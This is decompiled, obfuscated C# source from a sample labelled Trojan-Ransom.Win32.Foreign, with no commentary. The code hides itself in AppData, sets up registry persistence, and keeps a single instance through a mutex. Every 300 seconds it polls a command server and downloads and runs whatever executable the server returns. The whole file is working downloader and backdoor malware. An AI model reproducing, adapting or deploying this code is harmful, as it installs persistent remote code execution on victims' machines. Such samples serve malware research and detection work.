// Decompiled with JetBrains decompiler
// Type: 
// Assembly: directx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E1A2C9B9-DC80-4868-94B5-74DF307BFC32
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Foreign.ggnv-252b3db5f86199bed7197469826a07759a9f10473f4f37cffa6ec35b16d615b0.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

internal sealed class \u0008
{
  private static string \u0002 = \u000E.\u0002(-1920207066);
  private static int \u0003 = 300;
  private static string \u0005 = \u000E.\u0002(-1920207077);
  private static string \u0008 = \u0008.\u0002(32);

  private static string \u0002(int _param0)
  {
    string str = \u000E.\u0002(-1920207002);
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    for (int index = 0; index < _param0; ++index)
      stringBuilder.Append(str[random.Next(str.Length)]);
    return stringBuilder.ToString();
  }

  private static string \u0002(string _param0, string _param1)
  {
    ServicePointManager.Expect100Continue = false;
    using (WebClient webClient = new WebClient())
    {
      webClient.Headers.Add(\u000E.\u0002(-1920206933), \u000E.\u0002(-1920206914));
      return webClient.UploadString(_param0, \u000E.\u0002(-1920206874), _param1);
    }
  }

  private static void \u0002()
  {
    string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u000E.\u0002(-1920206867);
    try
    {
      System.IO.File.Copy(Assembly.GetEntryAssembly().Location, str, true);
      System.IO.File.SetAttributes(str, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
    }
    catch
    {
    }
    try
    {
      Registry.CurrentUser.OpenSubKey(\u000E.\u0002(-1920206898), true).SetValue(\u000E.\u0002(-1920207358), (object) str);
      Registry.CurrentUser.OpenSubKey(\u000E.\u0002(-1920207340), true).SetValue(\u000E.\u0002(-1920207270), (object) 2);
    }
    catch
    {
    }
  }

  private static void \u0003()
  {
    bool createdNew = false;
    Mutex mutex = new Mutex(true, \u000E.\u0002(-1920207193), out createdNew);
    if (createdNew)
      return;
    Environment.Exit(0);
  }

  private static void \u0002(string _param0)
  {
    string fileName = Environment.GetEnvironmentVariable(\u000E.\u0002(-1920207184)) + \u000E.\u0002(-1920207169) + \u0008.\u0002(12) + \u000E.\u0002(-1920207225);
    new WebClient().DownloadFile(_param0, fileName);
    new Process() { StartInfo = { FileName = fileName } }.Start();
    \u0008.\u0002(\u0008.\u0002, \u000E.\u0002(-1920207214) + \u0008.\u0008);
  }

  private static void \u0005()
  {
    try
    {
      \u0008.\u0003();
      \u0008.\u0002();
      while (true)
      {
        try
        {
          string str = \u0008.\u0002(\u0008.\u0002, \u000E.\u0002(-1920207130) + \u0008.\u0005 + \u000E.\u0002(-1920207120) + \u0008.\u0008);
          if (str != string.Empty)
            \u0008.\u0002(str);
        }
        catch
        {
        }
        Thread.Sleep(\u0008.\u0003 * 1000);
      }
    }
    catch
    {
    }
  }
}
